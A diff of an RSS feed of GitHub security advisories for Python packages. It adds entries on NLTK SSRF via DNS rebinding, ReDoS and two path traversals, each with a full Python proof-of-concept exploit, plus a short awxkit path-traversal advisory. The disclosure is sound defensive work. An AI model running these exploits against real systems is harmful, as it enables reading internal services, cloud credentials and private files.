@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-31T15:52:51.403Z</updated>
+    <updated>2026-07-31T17:17:01.157Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,884 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK): DNS-rebinding SSRF filter bypass in nltk.pathsec.urlopen (nltk.download / nltk.data.load) defeats ENFORCE mode]]></title>
+        <id>https://github.com/advisories/GHSA-qvv7-cg9c-w4x3</id>
+        <link href="https://github.com/advisories/GHSA-qvv7-cg9c-w4x3"/>
+        <updated>2026-07-31T16:51:30.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>nltk.pathsec</code> provides an SSRF filter that NLTK documents as a security control, blocking loopback, private, link-local, and multicast ranges (including obfuscated forms) and recommending strict <code>ENFORCE</code> mode for security-sensitive environments. The filter is bypassable by DNS rebinding: <code>validate_network_url()</code> resolves the hostname and checks the resulting IP, but the actual HTTP connection re-resolves the hostname independently at connect time and connects to that second result. The validated IP is never the one connected to. An attacker controlling DNS for a hostname (a TTL-0 rebinding record) returns a public IP for the validation lookup and an internal/loopback IP for the connection lookup, defeating the filter even under <code>nltk.pathsec.ENFORCE = True</code>.</p>
+<h3 id="details">Details</h3>
+<p><code>urlopen()</code> validates, then hands the raw hostname to <code>urllib</code>, which performs a second name resolution deep in the connection layer (<code>http.client.HTTPConnection.connect</code> → <code>socket.create_connection</code> → <code>socket.getaddrinfo</code>). The validation-side and connection-side resolutions are fully independent code paths with independent caches:</p>
+<ol>
+<li><code>validate_network_url()</code> calls <code>_resolve_hostname(parsed.hostname)</code> and checks each returned IP against loopback/link-local/multicast/private, blocking under <code>ENFORCE</code>. (Resolution #1.)</li>
+<li><code>urlopen()</code> then calls <code>build_opener(...).open(url)</code> with the original URL (raw hostname), so <code>urllib</code> resolves the hostname again at connect time. (Resolution #2 — the address actually connected to.)</li>
+</ol>
+<p><code>_resolve_hostname</code> is decorated with <code>lru_cache</code> and its docstring claims to mitigate DNS rebinding, but the cache only memoizes the validation-side lookup. The connection layer's <code>getaddrinfo</code> does not consult that cache, so it provides no protection. The annotation is a false assurance: an operator reading it may believe rebinding is handled when it is not.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">import socket
+import threading
+import warnings
+from collections import defaultdict
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+warnings.filterwarnings("ignore")
+
+import nltk
+import nltk.pathsec as ps
+
+ps.ENFORCE = True  # the documented strict SSRF sandbox
+
+ATTACKER_HOST = "rebind.attacker.test"   # attacker-controlled authoritative DNS
+PUBLIC_IP = "93.184.216.34"              # public address served for the validation lookup
+SECRET = b"TOP-SECRET-LOOPBACK-ONLY-METADATA-CREDENTIALS"
+
+
+# --- A loopback-only "internal service" (stands in for 169.254.169.254 / admin UI) ---
+class _Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-Type", "text/plain")
+        self.send_header("Content-Length", str(len(SECRET)))
+        self.end_headers()
+        self.wfile.write(SECRET)
+
+    def log_message(self, *a):
+        pass
+
+
+def start_internal_server():
+    srv = HTTPServer(("127.0.0.1", 0), _Handler)
+    threading.Thread(target=srv.serve_forever, daemon=True).start()
+    return srv.server_address[1]  # ephemeral port
+
+
+# --- Model the TTL-0 rebinding record at the resolver layer ---
+_real_getaddrinfo = socket.getaddrinfo
+_lookups = defaultdict(int)
+
+
+def _rebinding_getaddrinfo(host, port, *args, **kwargs):
+    if host == ATTACKER_HOST:
+        n = _lookups[host]
+        _lookups[host] += 1
+        ip = PUBLIC_IP if n == 0 else "127.0.0.1"   # 1st=public (validate), then loopback (connect)
+        p = port if isinstance(port, int) else 0
+        kind = "VALIDATION -&gt; public" if n == 0 else "CONNECT    -&gt; loopback"
+        print(f"    [dns] getaddrinfo({host!r}) lookup #{n}: {kind} ({ip})")
+        return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", (ip, p))]
+    return _real_getaddrinfo(host, port, *args, **kwargs)
+
+
+def fetch(url):
+    with ps.urlopen(url, timeout=5) as r:
+        return r.read()
+
+
+def main():
+    print("=" * 62)
+    print(f" NLTK pathsec DNS-rebinding SSRF bypass PoC")
+    print(f" nltk {nltk.__version__}   |   nltk.pathsec.ENFORCE = {ps.ENFORCE}")
+    print("=" * 62)
+
+    port = start_internal_server()
+    print(f"[*] internal loopback service: http://127.0.0.1:{port}/  (returns secret)\n")
+
+    socket.getaddrinfo = _rebinding_getaddrinfo
+    ps._resolve_hostname.cache_clear()  # fresh validation cache, as on a real process
+    try:
+        # ---- Control: a DIRECT loopback URL must be blocked by the filter ----
+        print("[1] CONTROL: direct loopback URL (filter must block this)")
+        direct = f"http://127.0.0.1:{port}/"
+        try:
+            fetch(direct)
+            print(f"    [?] unexpected: {direct} was NOT blocked\n")
+            control_ok = False
+        except PermissionError as e:
+            print(f"    [OK] blocked -&gt; PermissionError: {e}\n")
+            control_ok = True
+
+        # ---- Attack: rebinding hostname bypasses the same filter ----
+        print("[2] ATTACK: rebinding hostname (public at validate, loopback at connect)")
+        evil = f"http://{ATTACKER_HOST}:{port}/"
+        print(f"    fetching {evil}")
+        try:
+            body = fetch(evil)
+            leaked = SECRET in body
+            print(f"    body returned to caller: {body!r}")
+            if leaked:
+                print("\n  [VULN] loopback-only secret exfiltrated through pathsec.urlopen")
+                print(f"         validated IP = {PUBLIC_IP} (public)  but  connected IP = 127.0.0.1")
+                print(f"         non-blind SSRF despite ENFORCE = {ps.ENFORCE}")
+                verdict = "VULNERABLE"
+            else:
+                print("\n  [?] fetch succeeded but secret marker not present")
+                verdict = "INCONCLUSIVE"
+        except PermissionError as e:
+            # Patched build: validate against the connect-time IP (or pin/resolve-once).
+            print(f"\n  [SAFE] blocked -&gt; PermissionError: {e}")
+            verdict = "NOT VULNERABLE"
+    finally:
+        socket.getaddrinfo = _real_getaddrinfo
+
+    print("\n" + "=" * 62)
+    print(f" Control (direct loopback blocked): {control_ok}")
+    print(f" Result: {verdict}   (ENFORCE = {ps.ENFORCE})")
+    print("=" * 62)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Full-response (non-blind) SSRF.</strong> Because the fetched body is returned to the caller (e.g. <code>nltk.data.load</code> with <code>format="raw"</code>), an attacker can read responses from internal-only HTTP services, loopback admin interfaces, and — most seriously — the cloud instance metadata service, which on major cloud providers can expose IAM/service credentials and lead to cloud account compromise.</li>
+<li><strong>Bypass of an explicit security control.</strong> It defeats the <code>nltk.pathsec</code> SSRF filter, including the <code>ENFORCE</code> mode that NLTK's documentation recommends precisely for environments where untrusted input may reach NLTK. Deployments that adopted that boundary are not actually protected, and the <code>lru_cache</code> annotation claiming to mitigate rebinding makes the false assurance worse.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-qvv7-cg9c-w4x3">https://github.com/nltk/nltk/security/advisories/GHSA-qvv7-cg9c-w4x3</a></li>
+<li><a href="https://github.com/advisories/GHSA-qvv7-cg9c-w4x3">https://github.com/advisories/GHSA-qvv7-cg9c-w4x3</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qvv7-cg9c-w4x3</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-31T16:51:29.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK): ReDoS in NLTK ReviewsCorpusReader FEATURES regex]]></title>
+        <id>https://github.com/advisories/GHSA-fg7f-2386-8897</id>
+        <link href="https://github.com/advisories/GHSA-fg7f-2386-8897"/>
+        <updated>2026-07-31T16:51:10.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>ReviewsCorpusReader</code> extracts feature annotations of the form <em>label</em> followed by a bracketed signed digit (e.g. a label then <code>[+2]</code>) from each review line, using the module-level <code>FEATURES</code> regex. The feature-label sub-pattern is unbounded — an optional greedy run of word-plus-whitespace groups followed by another word, which must then be followed by a literal <code>[</code>. On a long bracket-less line the label can match from every search position to the end of the line, causing quadratic backtracking. A single crafted line in a reviews corpus hangs <code>reviews()</code>, <code>features()</code>, and <code>sents()</code>. </p>
+<h3 id="details">Details</h3>
+<p>The label alternative is a greedy, unanchored run of word-plus-whitespace groups followed by a word, which must then be followed by a literal <code>[</code>. On an input that is a long sequence of word-plus-whitespace with no bracket, at each of the <em>n</em> starting positions the engine greedily extends the label to the end of the line, only then fails to find the bracket, and backtracks the whole way. <code>re.findall</code> repeats this from every position, giving O(n²) total work. There is no exponential blow-up, but quadratic growth on an attacker-controlled line length is enough to hang the reader: a single line of ~100,000 words consumes CPU for tens of seconds to minutes.</p>
+<h3 id="poc">PoC</h3>
+<pre><code>import multiprocessing as mp
+import re
+import time
+
+# --- The vulnerable regex, verbatim from nltk/corpus/reader/reviews.py L70-71 ---
+FEATURES_VULN = re.compile(r"((?:(?:\w+\s)+)?\w+)\[((?:\+|\-)\d)\]")
+
+# --- Bounded variant from the fix (PR #3583): cap the per-label word run.
+#     A generous bound (real feature labels are short noun phrases) makes the
+#     run linear while never affecting legitimate corpora. ---
+WORD_BOUND = 50
+FEATURES_FIXED = re.compile(
+    r"((?:(?:\w+\s){0,%d})?\w+)\[((?:\+|\-)\d)\]" % WORD_BOUND
+)
+
+TIMEOUT = 20.0  # seconds, per measurement
+SIZES = [1000, 2000, 4000, 8000, 16000]  # words on a single bracket-less line
+
+
+def _bad_line(n_words):
+    """A long line of plain words with NO trailing bracketed annotation."""
+    return ("word " * n_words).rstrip()
+
+
+def _worker(pattern_str, line, q):
+    pat = re.compile(pattern_str)
+    t0 = time.perf_counter()
+    pat.findall(line)
+    q.put(time.perf_counter() - t0)
+
+
+def timed_findall(pattern, line, timeout=TIMEOUT):
+    """Run pattern.findall(line) in a killable process; return seconds or None (timeout)."""
+    q = mp.Queue()
+    p = mp.Process(target=_worker, args=(pattern.pattern, line, q))
+    p.start()
+    p.join(timeout)
+    if p.is_alive():
+        p.terminate()
+        p.join()
+        return None
+    return q.get() if not q.empty() else None
+
+
+def bench(label, pattern):
+    print(f"\n[{label}]  pattern: {pattern.pattern}")
+    print(f"  {'words':&gt;7} {'~bytes':&gt;8}   {'time':&gt;12}   {'x prev':&gt;7}")
+    prev = None
+    for n in SIZES:
+        line = _bad_line(n)
+        t = timed_findall(pattern, line)
+        if t is None:
+            print(f"  {n:&gt;7} {len(line):&gt;8}   {'&gt;%.0fs TIMEOUT' % TIMEOUT:&gt;12}   {'--':&gt;7}")
+            prev = None
+        else:
+            ratio = f"{t/prev:.1f}x" if prev else "--"
+            print(f"  {n:&gt;7} {len(line):&gt;8}   {t*1000:&gt;9.1f} ms   {ratio:&gt;7}")
+            prev = t
+
+
+def parity_check():
+    """The bound must NOT change extraction on a realistic annotated line."""
+    real = (
+        "the picture quality[+2] and battery life[+1] are great but "
+        "the lens cap[-1] feels cheap and the menu system[-2] is slow"
+    )
+    a = FEATURES_VULN.findall(real)
+    b = FEATURES_FIXED.findall(real)
+    print("\n[parity] realistic annotated line — extraction must be identical")
+    print(f"  vulnerable regex -&gt; {a}")
+    print(f"  bounded   regex  -&gt; {b}")
+    print(f"  identical: {a == b}")
+    return a == b
+
+
+def main():
+    print("=" * 66)
+    print(" NLTK ReviewsCorpusReader FEATURES ReDoS PoC (quadratic backtracking)")
+    print("=" * 66)
+    print(f" per-call timeout = {TIMEOUT:.0f}s   word bound (fix) = {WORD_BOUND}")
+
+    bench("VULNERABLE  reviews.py L70-71", FEATURES_VULN)
+    bench("BOUNDED     fix #3583", FEATURES_FIXED)
+    same = parity_check()
+
+    print("\n" + "=" * 66)
+    print(" Vulnerable: ~4x time per input doubling  =&gt; O(n^2) quadratic ReDoS")
+    print(" Bounded:    ~2x time per input doubling  =&gt; O(n)   linear, stays in ms")
+    print(f" Extraction parity on real annotations preserved: {same}")
+    print(" A single ~100k-word bracket-less review line hangs reviews()/features()/sents().")
+    print("=" * 66)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Denial of service. Processing a single crafted line through <code>ReviewsCorpusReader</code> consumes CPU quadratically in the line length, hanging the calling thread or process. An application that loads an untrusted or user-supplied reviews corpus (multi-tenant pipelines, services that accept user-provided corpora, batch or CI jobs) can be stalled by one malicious line, with no authentication and no privileges required.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-fg7f-2386-8897">https://github.com/nltk/nltk/security/advisories/GHSA-fg7f-2386-8897</a></li>
+<li><a href="https://github.com/advisories/GHSA-fg7f-2386-8897">https://github.com/advisories/GHSA-fg7f-2386-8897</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fg7f-2386-8897</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-31T16:51:09.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK): Path Traversal in NKJPCorpusReader leads to Arbitrary File Read and bypasses the nltk.pathsec sandbox (ENFORCE=True)]]></title>
+        <id>https://github.com/advisories/GHSA-6hm5-jgcp-p838</id>
+        <link href="https://github.com/advisories/GHSA-6hm5-jgcp-p838"/>
+        <updated>2026-07-31T16:50:55.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>   A path-traversal vulnerability in <code>NKJPCorpusReader</code> allows an attacker who can
+   influence the <code>fileids</code> argument of its public read methods (<code>header</code>, <code>raw</code>,
+   <code>words</code>, <code>sents</code>, <code>tagged_words</code>) to read files outside the corpus root. The
+   reader builds the file path with no containment check and opens it with the
+   builtin <code>open()</code>, so it bypasses NLTK's <code>nltk.pathsec</code> sandbox — including the
+   strict <code>ENFORCE = True</code> mode that <code>SECURITY.md</code> recommends for web/multi-tenant
+   deployments. <code>header()</code> returns the parsed content of the out-of-root file to
+   the caller (arbitrary file read).</p>
+<h3 id="details">Details</h3>
+<p>   <code>SECURITY.md</code> promises that file access is "validated against allowed NLTK data
+   directories" and that with <code>nltk.pathsec.ENFORCE = True</code> "unauthorized file
+   access … will raise <code>PermissionError</code>." That guarantee is enforced via
+   <code>FileSystemPathPointer.open()</code> / <code>CorpusReader.open()</code>, which call
+   <code>nltk.pathsec.validate_path(...)</code>.</p>
+<p>   <code>NKJPCorpusReader</code> never uses that protected path. In
+   <code>nltk/corpus/reader/nkjp.py</code>:</p>
+<ul>
+<li><code>add_root()</code> builds the path by <strong>plain string concatenation</strong> with no
+normalization or containment check:<pre><code class="language-python">def add_root(self, fileid):          # lines 96-102
+    if self.root in fileid:
+        return fileid                # attacker-controlled value returned unchanged
+    return self.root + fileid        # plain concat, '..' not stripped
+</code></pre>
+</li>
+<li>The header view appends a fixed basename and passes the string straight into
+the corpus view (which opens it with the builtin <code>open()</code>):<pre><code class="language-python">class NKJPCorpus_Header_View(XMLCorpusView):   # line 181
+    def __init__(self, filename, **kwargs):
+        XMLCorpusView.__init__(self, filename + "header.xml", self.tagspec)  # line 189
+</code></pre>
+</li>
+<li>The other modes reach the filesystem through <code>XML_Tool</code>, which uses a raw
+<code>os.path.join</code> (not the hardened <code>FileSystemPathPointer.join()</code>) and the
+builtin <code>open()</code>:<pre><code class="language-python">class XML_Tool:                                  # line 243
+    def __init__(self, root, filename):
+        self.read_file = os.path.join(root, filename)   # line 251
+    def build_preprocessed_file(self):
+        fr = open(self.read_file)                        # line 256 — pathsec never consulted
+</code></pre>
+</li>
+</ul>
+<p>   Because <code>open()</code> is the builtin (not <code>PathPointer.open()</code>), the <code>pathsec</code>
+   sentinel is never invoked, so <code>ENFORCE = True</code> does not block the access. For
+   comparison, the safe API <code>CorpusReader.open()</code> (<code>nltk/corpus/reader/api.py:222</code>)
+   rejects <code>..</code>/absolute fileids and calls <code>validate_path(..., required_root=...)</code>
+   before opening — <code>NKJPCorpusReader</code> simply does not go through it.</p>
+<h3 id="poc">PoC</h3>
+<p>   Tested against <code>nltk==3.9.4</code> (latest PyPI release) and current <code>develop</code>.</p>
+<pre><code>pip install "nltk==3.9.4"
+python3 poc.py
+</code></pre>
+<p>   <code>poc.py</code>:</p>
+<pre><code class="language-python">import builtins, os, shutil, tempfile, warnings
+warnings.simplefilter("ignore")
+import nltk, nltk.pathsec as pathsec
+from nltk.corpus.reader.nkjp import NKJPCorpusReader
+
+print("nltk", nltk.__version__)
+
+# A legitimate, empty NKJP corpus root (what a real app has).
+root = tempfile.mkdtemp(prefix="nkjp_corpus_root_")
+os.makedirs(os.path.join(root, "sample"), exist_ok=True)
+open(os.path.join(root, "sample", "header.xml"), "w").write("&lt;x/&gt;")
+
+# The attacker's target: a file OUTSIDE the corpus root.
+secret_dir = tempfile.mkdtemp(prefix="OUTSIDE_ROOT_")
+open(os.path.join(secret_dir, "header.xml"), "w").write(
+"&lt;teiHeader&gt;&lt;fileDesc&gt;&lt;sourceDesc&gt;&lt;bibl&gt;"
+"&lt;title&gt;SECRET-API-KEY=sk-live-DEADBEEF&lt;/title&gt;"
+    "&lt;/bibl&gt;&lt;/sourceDesc&gt;&lt;/fileDesc&gt;&lt;/teiHeader&gt;")
+
+# Enable the strict mode SECURITY.md recommends for web / multi-tenant.
+pathsec.ENFORCE = True
+print("ENFORCE =", pathsec.ENFORCE)
+
+# Prove the out-of-root read and that pathsec is never consulted.
+opened = []; real = builtins.open
+builtins.open = lambda f, *a, **k: (opened.append(str(f)), real(f, *a, **k))[1]
+
+reader = NKJPCorpusReader(root=root + "/", fileids="sample")
+# Attacker-controlled `fileids`; '..' escapes the corpus root:
+evil = root + "/../../../../../../.." + secret_dir + "/"
+try:
+    result = reader.header(fileids=[evil])
+finally:
+    builtins.open = real
+
+print("opened outside root:", [p for p in opened if "OUTSIDE_ROOT_" in p][:1])
+print("disclosed content  :", result[0]["title"])
+shutil.rmtree(root, ignore_errors=True); shutil.rmtree(secret_dir, ignore_errors=True)
+</code></pre>
+<p>   Output (unmodified):</p>
+<pre><code>nltk 3.9.4
+ENFORCE = True
+opened outside root: ['/tmp/nkjp_corpus_root_XXXX/../../../../../../../tmp/OUTSIDE_ROOT_YYYY/header.xml']
+disclosed content  : SECRET-API-KEY=sk-live-DEADBEEF
+</code></pre>
+<p>   With <code>ENFORCE = True</code>, NLTK opened a file outside the corpus root via the
+   builtin <code>open()</code> (no <code>PermissionError</code>, no warning) and returned its content.</p>
+<h3 id="impact">Impact</h3>
+<p>   This is a path traversal (CWE-22) leading to arbitrary file read. Any
+   application that passes attacker-influenced values into <code>NKJPCorpusReader</code>'s
+   <code>fileids</code> (e.g. letting a user choose which corpus document to read) is
+   affected; the attacker can escape the corpus root and read files elsewhere on
+   the host, defeating the <code>ENFORCE=True</code> sandbox.</p>
+<p>   Honest scoping: <code>header()</code> discloses the content of out-of-root files named
+   <code>header.xml</code> containing NKJP header XML. <code>raw()</code>/<code>words()</code>/<code>sents()</code> also open
+   and read an arbitrary out-of-root file (proven by intercepting <code>open()</code>), but a
+   separate pre-existing bug in <code>XML_Tool</code> (writing <code>str</code> to a binary
+   <code>NamedTemporaryFile</code>) suppresses their return value on current Python, so for
+   those modes the impact is arbitrary file open/read. The attacker chooses the
+   directory freely; a fixed basename is appended per mode. The same
+   "build-path-then-builtin-open, skipping pathsec" anti-pattern also appears in
+   <code>xmldocs.py:161</code>, <code>util.py:212,215</code>, <code>crubadan.py:78,97</code>, <code>lin.py:43</code>,
+   <code>ipipan.py:191</code>, <code>pl196x.py:110</code> and is worth fixing as a class.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-6hm5-jgcp-p838">https://github.com/nltk/nltk/security/advisories/GHSA-6hm5-jgcp-p838</a></li>
+<li><a href="https://github.com/advisories/GHSA-6hm5-jgcp-p838">https://github.com/advisories/GHSA-6hm5-jgcp-p838</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6hm5-jgcp-p838</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-31T16:50:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nltk] Natural Language Toolkit (NLTK) has path traversal in FramenetCorpusReader.frame() that allows arbitrary XML file read, bypassing the nltk.pathsec sandbox (ENFORCE=True)]]></title>
+        <id>https://github.com/advisories/GHSA-xh95-f55m-82fw</id>
+        <link href="https://github.com/advisories/GHSA-xh95-f55m-82fw"/>
+        <updated>2026-07-31T16:50:41.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>FramenetCorpusReader.frame(name)</code> interpolates a caller-supplied frame name into an XML file path that is read with the builtin <code>open()</code>, bypassing <code>CorpusReader.open()</code> and the <code>nltk.pathsec</code> sandbox — including strict <code>ENFORCE=True</code> mode. A <code>../</code> sequence in the name escapes the corpus root, yielding an arbitrary XML file read whose parsed content is returned to the caller.</p>
+<h3 id="details">Details</h3>
+<p><code>frame_by_name</code> builds the path by joining the corpus root, the frame directory, and the caller-supplied name with a fixed <code>.xml</code> extension, with no containment check, then constructs an <code>XMLCorpusView</code> from that <strong>string</strong> path. Because the view is built from a string rather than a <code>PathPointer</code>, it reads with the builtin <code>open()</code>, so <code>nltk.pathsec.validate_path()</code> is never invoked and <code>ENFORCE=True</code> does not block the access. This is the same path-traversal class previously hardened for the generic corpus readers; <code>frame_by_name</code> never goes through <code>CorpusReader.open()</code>, so that protection does not apply.</p>
+<p>The same string-path-into-<code>XMLCorpusView</code> pattern exists in two sibling methods that take a name from corpus data rather than the immediate caller:</p>
+<ul>
+<li><code>doc()</code> — uses the index entry <code>filename</code> field</li>
+<li>the lexical-unit file loader — uses the <code>lexUnit</code> ID attribute</li>
+</ul>
+<p>These are reachable through a malicious or attacker-modified FrameNet corpus index.</p>
+<h3 id="poc">PoC</h3>
+<pre><code class="language-python">"""
+
+import os
+import sys
+import tempfile
+import warnings
+from pathlib import Path
+
+warnings.filterwarnings("ignore")
+
+# --- Turn the documented strict sandbox ON, before importing the reader. ---
+import nltk.pathsec as ps
+ps.ENFORCE = True
+
+import nltk
+from nltk.corpus.reader.framenet import FramenetCorpusReader, FramenetError
+
+FRAME_XML = (
+    '&lt;?xml version="1.0" encoding="UTF-8"?&gt;\n'
+    '&lt;frame xmlns="http://framenet.icsi.berkeley.edu" ID="1337" name="pwned"&gt;\n'
+    "&lt;definition&gt;SECRET-OUT-OF-ROOT-CONTENT&lt;/definition&gt;\n"
+    "&lt;/frame&gt;\n"
+)
+
+BANNER = """\
+===========================================================
+ NLTK FramenetCorpusReader.frame() Path Traversal PoC
+ nltk {ver}   |   nltk.pathsec.ENFORCE = {enforce}
+===========================================================""".format(
+    ver=nltk.__version__, enforce=ps.ENFORCE
+)
+
+
+def build_corpus():
+    """Minimal valid FrameNet corpus + a frame-shaped secret OUTSIDE its root."""
+    base = Path(tempfile.mkdtemp(prefix="fn_poc_"))
+    root = base / "corpora" / "framenet"
+    for d in ("frame", "fulltext", "lu"):
+        (root / d).mkdir(parents=True)
+    (root / "frameIndex.xml").write_text(
+        '&lt;?xml version="1.0"?&gt;&lt;frameIndex&gt;&lt;/frameIndex&gt;'
+    )
+    (root / "frRelation.xml").write_text(
+        '&lt;?xml version="1.0"?&gt;&lt;frameRelations&gt;&lt;/frameRelations&gt;'
+    )
+
+    # A frame-shaped XML file OUTSIDE the corpus root (the "sensitive" target).
+    secret = base / "private"
+    secret.mkdir()
+    (secret / "secret.xml").write_text(FRAME_XML)
+
+    return base, root, secret / "secret.xml"
+
+
+def main():
+    print(BANNER)
+    base, root, secret_path = build_corpus()
+    print(f"[*] corpus root : {root}")
+    print(f"[*] secret file : {secret_path}  (OUTSIDE the root)\n")
+
+    fn = FramenetCorpusReader(str(root), [])
+
+    # Attacker-controlled frame name climbs out of &lt;root&gt;/frame/ up to &lt;base&gt;/private/secret.xml
+    evil = os.path.join("..", "..", "..", "private", "secret")
+    print(f"[*] calling   fn.frame({evil!r})")
+
+    try:
+        f = fn.frame(evil)
+        definition = f["definition"]
+        if "SECRET-OUT-OF-ROOT-CONTENT" in definition:
+            print("\n  [VULN] out-of-root file was read and returned to caller")
+            print(f"         frame name : {evil}")
+            print(f"         frame ID   : {f['ID']}   name: {f['name']}")
+            print(f"         definition : {definition}")
+            print(f"\n  -&gt; nltk.pathsec sandbox bypassed despite ENFORCE = {ps.ENFORCE}")
+            verdict = "VULNERABLE"
+        else:
+            print(f"\n  [?] frame() returned but content unexpected: {definition!r}")
+            verdict = "INCONCLUSIVE"
+    except FramenetError as e:
+        # Patched build (#3581): _reject_unsafe_path_component raises before open().
+        print(f"\n  [SAFE] FramenetError: {e}")
+        print("         traversal rejected before any file was opened (patched)")
+        verdict = "NOT VULNERABLE"
+    except Exception as e:
+        print(f"\n  [SAFE] {type(e).__name__}: {e}")
+        verdict = "NOT VULNERABLE"
+
+    # Control: a plain absent name must fail as 'Unknown frame', NOT as a read.
+    print("\n[CONTROL] benign absent name should be 'Unknown frame':")
+    try:
+        fn.frame("Definitely_Not_A_Frame")
+        print("  [?] unexpectedly succeeded")
+    except Exception as e:
+        print(f"  ok -&gt; {type(e).__name__}: {e}")
+
+    print("\n" + "=" * 59)
+    print(f" Result: {verdict}  (ENFORCE = {ps.ENFORCE})")
+    print("=" * 59)
+
+
+if __name__ == "__main__":
+    main()
+</code></pre>
+<h3 id="impact">Impact</h3>
+<ul>
+<li><strong>Out-of-sandbox arbitrary XML read.</strong> Any application that routes attacker-influenced input into <code>frame()</code> can be made to read XML files from directories outside the intended corpus root and have their parsed content returned. <code>frame()</code> is a primary public API designed to accept a caller-specified frame name, so this is a natural exposure for any service exposing FrameNet lookups to user input.</li>
+<li><strong>Broad read primitive.</strong> Only a fixed <code>.xml</code> extension is appended; the attacker controls both directory and basename, giving "read any XML file the process can read." Full content disclosure requires frame-shaped XML; other files yield a distinguishable parse error that acts as a file-existence/readability oracle for arbitrary paths.</li>
+<li><strong>Silent bypass of an advertised boundary.</strong> NLTK's <code>SECURITY.md</code> presents the <code>nltk.pathsec</code> sandbox and <code>ENFORCE=True</code> as a hard boundary for web apps, multi-tenant pipelines, and CI/CD. Because <code>frame_by_name</code> builds the path itself and reads through a string-path <code>XMLCorpusView</code>, the containment guard is never called and <code>ENFORCE=True</code> does not block the read — silently, with no error or warning.</li>
+<li><strong>Crafted-corpus reach.</strong> Via <code>doc()</code> and the lexical-unit loader, a malicious FrameNet data directory drives the same traversal with no caller-supplied name.</li>
+<li><strong>Sensitive targets.</strong> Depending on deployment, readable out-of-root XML can include application configuration, data exports, and on-disk credentials stored as XML; the oracle behavior also allows filesystem mapping. Where <code>frame()</code> output is reflected to the requester, disclosure is direct and non-blind.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nltk/nltk/security/advisories/GHSA-xh95-f55m-82fw">https://github.com/nltk/nltk/security/advisories/GHSA-xh95-f55m-82fw</a></li>
+<li><a href="https://github.com/advisories/GHSA-xh95-f55m-82fw">https://github.com/advisories/GHSA-xh95-f55m-82fw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xh95-f55m-82fw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-31T16:50:41.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[awxkit] awxkit has a path traversal vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-g29c-rgq6-gxgj</id>
+        <link href="https://github.com/advisories/GHSA-g29c-rgq6-gxgj"/>
+        <updated>2026-07-31T16:39:06.000Z</updated>
+        <content type="html"><![CDATA[<p>A path traversal vulnerability was found in awxkit, the CLI tool for AWX. The YAML !include directive does not sanitize file paths, allowing an attacker to craft a malicious YAML file that reads arbitrary YAML-formatted files from the local filesystem when a user imports it using "awx --conf.format yaml import". This is a client-side vulnerability requiring user interaction.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-52902">https://nvd.nist.gov/vuln/detail/CVE-2026-52902</a></li>
+<li><a href="https://access.redhat.com/security/cve/CVE-2026-52902">https://access.redhat.com/security/cve/CVE-2026-52902</a></li>
+<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2486729">https://bugzilla.redhat.com/show_bug.cgi?id=2486729</a></li>
+<li><a href="https://github.com/advisories/GHSA-g29c-rgq6-gxgj">https://github.com/advisories/GHSA-g29c-rgq6-gxgj</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-g29c-rgq6-gxgj</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-09T12:32:04.000Z</published>
+    </entry>
+    <entry>
